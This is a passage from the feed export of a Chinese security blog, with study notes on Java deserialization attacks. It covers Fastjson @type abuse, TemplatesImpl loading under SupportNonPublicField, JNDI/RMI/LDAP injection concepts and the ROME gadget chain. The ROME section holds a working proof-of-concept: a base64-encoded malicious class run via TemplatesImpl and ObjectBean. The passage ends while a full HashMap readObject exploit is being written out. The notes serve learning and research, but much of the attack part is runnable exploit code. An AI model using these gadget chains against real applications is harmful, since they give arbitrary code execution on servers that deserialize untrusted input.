&#125;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(s, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>回忆：在<strong>TemplateImpl</strong>中我们注意的点就是那三个参数值，两个不为空，一个要实例化。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112551.png" alt="QQ截图20220307193542"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071936060.png" alt="QQ截图20220307193608"></p><p>可以注意到，这里的<strong>name</strong> 、<strong>bytecode</strong>都有自己set方法，虽然是私有属性但是也可以赋值。<br>但是不碰巧这里的<strong>tfactory</strong>没有自己的set方法。<br>但是碰巧的是fastjson中</p><p><strong>如果开启了，Feature.SupportNonPublicField。在fastjson反序列化的时候会判断是否存在无参构造函数，如果存在的话就会直接去调用setter方法给属性赋值，而没有 setter 方法的属性如果开启了Feature.SupportNonPublicField的话也会通过反射去给属性赋值。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112058.png" alt="QQ截图20220307205404"></p><p>这里判断了<strong>SupportNonPublicField</strong></p><p>实在不想截图。最后就会调用到getO..方法。触发TemplatesImpl链。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112931.png" alt="QQ截图20220307211055"></p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI+LDAP+JRMP+JNDI（了解）</title>
    <link href="/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/"/>
    <url>/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p><strong>使客户机上运行的程序可以调用远程服务器上的对象。</strong></p><p>这里我们要清楚，在客户端从服务端传递都是以字节序列传递的，最终一定会经过反序列化。</p><h1 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h1><p>一种在使用RMI的过程中的协议，可以组织数据格式通过TCP进行传输，从而达到RMI。</p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>一种java命名和目录的接口。而这里我们可以知道rmi和ldap也是目录服务系统。JNDI的接口下有许多目录系统服务（rmi、ldap），我们能够通过名称等去找到相关的对象，并且把它下载到客户端。</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>动态加载类这个技术就是为了实现，当本地没有定义远程对象所对应的类的时候，还能对远程对象进行调用。</p><p>具体实现逻辑为：</p><ul><li><p>客户端使用lookup函数访问一个本地不存在对应类的远程对象</p></li><li><p>服务端会返回一个reference对象，对象中会指定一个远程类让其去下载</p></li><li><p>客户端下载远程类并实例化，并且调用远程类的<strong>getObjectInstance</strong>函数获取外部远程对象实例。</p><p>综上，如果我们<strong>可以控制lookup函数的值</strong>，那么让其访问一个我们自己的恶意rmi服务器，让其下载我们构造的恶意class文件并实例话，即可实现任意代码执行。</p></li></ul><h2 id="RMI-LDAP注入版本问题"><a href="#RMI-LDAP注入版本问题" class="headerlink" title="RMI+LDAP注入版本问题"></a>RMI+LDAP注入版本问题</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071836554.png"></p><p>简单了解一下。因为想弄fastjson。后续在复习具体的实现步骤。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（入门）</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（入门）"><a href="#Fastjson（入门）" class="headerlink" title="Fastjson（入门）"></a>Fastjson（入门）</h1><p>跟着先知社区再来复习一下。本文纯按照先知社区的复习。基本雷同。<a href="https://xz.aliyun.com/t/8979">https://xz.aliyun.com/t/8979</a></p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">20</span>);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);<br>        System.out.println(s);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SerializerFeature.WriteClassName</code>是<code>toJSONString</code>设置的一个属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写上被序列化的类名，<code>type</code>可以指定反序列化的类，并且调用其<code>getter/setter/is</code>方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734193.png" alt="QQ截图20220307161936"></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>两种反序列化的方式。<strong>parseObject</strong>和<strong>parse</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(s));<br>        System.out.println(JSON.parseObject(s));<br>        System.out.println(JSON.parseObject(s,Person.class));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>值得注意的是这里只有第三步才指明了对象，并且讲Person反序列。而且这里<strong>并没有触发getter方法。</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734792.png" alt="QQ截图20220307162915"></p><p>这时候我们就可以理解到@type的作用了。指定一个类反序列化。<br>看看效果。分别测试。</p><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse()"></a>JSON.parse()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>   System.out.println(JSON.parse(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734823.png" alt="QQ截图20220307163225"></p><p><strong>没有触发getter方法。</strong></p><h3 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject()"></a>JSON.parseObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>       System.out.println(JSON.parseObject(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071634121.png" alt="QQ截图20220307163400"></p><p>均触发。<br>那我们就可以思考这样的指定类反序列化。肯定会造成反序列化漏洞。<br>只要在setter、getter、is中添加恶意命令。</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>在分别对应的地方添加。发现均可弹出计算器。</p><h2 id="反序列化的流程"><a href="#反序列化的流程" class="headerlink" title="反序列化的流程"></a>反序列化的流程</h2><p>这里只说一些关键部分。（个人认为）</p><p>通过这里判断的为12。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071721973.png" alt="QQ截图20220307172125"></p><p>会来到这里。这里的<strong>LBRACE&#x3D;12</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734973.png" alt="QQ截图20220307172241"></p><p><strong>scanSymbol</strong>获取到了指定的@type类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734456.png" alt="QQ截图20220307172427"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734100.png" alt="QQ截图20220307172608"></p><p>后面跟进会知道过滤了反序列化的类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734839.png" alt="QQ截图20220307172959"></p><p>后面应该要学习一下RMI方面的相关知识。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROME链</title>
    <link href="/2022/03/06/ROME%E9%93%BE/"/>
    <url>/2022/03/06/ROME%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>终于把他弄明白了。<br>先来看看利用链。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a href="http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar">http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar</a><br>自行导入一下。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br></code></pre></td></tr></table></figure><h2 id="ObjectBean-toString"><a href="#ObjectBean-toString" class="headerlink" title="ObjectBean#toString()"></a>ObjectBean#toString()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206065.png" alt="QQ截图20220306120645"></p><p>跟进<strong>toString()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420748.png" alt="QQ截图20220306121009"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061210855.png" alt="QQ截图20220306121028"></p><p>获取调用链中上一个类或 <code>_obj</code> 属性中保存对象的类名（对本题得作用不大），并调用第二个 toString 方法。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420891.png" alt="QQ截图20220306123426"></p><p>这里会将_obj实例中的getter方法全部执行，那么就想到了,之前分析的文章<br><strong>CommonsBeanutils无cc依赖</strong>里面用到的调用getter方法，从而成功加载恶意类。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>        delegate.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可成功触发计算器。</p><h4 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>  delegate.toString();<br></code></pre></td></tr></table></figure><p>接下来就要思考如何加入<strong>反序列化</strong>。</p><h2 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean#hashCode"></a>ObjectBean#hashCode</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420042.png" alt="QQ截图20220306114759"></p><p>跟进<strong>beanHashCode()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206491.png" alt="QQ截图20220306114855"></p><p>然后我们就要考虑这里怎么回调到<strong>ObjectBean#toString</strong>？事实上我们可以进行多重封装。比如这样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br></code></pre></td></tr></table></figure><p>这样我们不仅调用了<strong>ObjectBean#hashCode</strong>还调用了<strong>ObjectBean#toString</strong>。为了避免在序列化之前就弹出计算器。我们可以在put进map中之后在进行<strong>反射</strong>修改值就可以了。</p><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap#readObject"></a>HashMap#readObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420627.png" alt="QQ截图20220306134313"><br>跟进hash。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061343916.png" alt="QQ截图20220306134328"><br>这里会调用**key.hashCode()**。<br>这里得key可以控制。那么我们一条完整得链子就出来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span 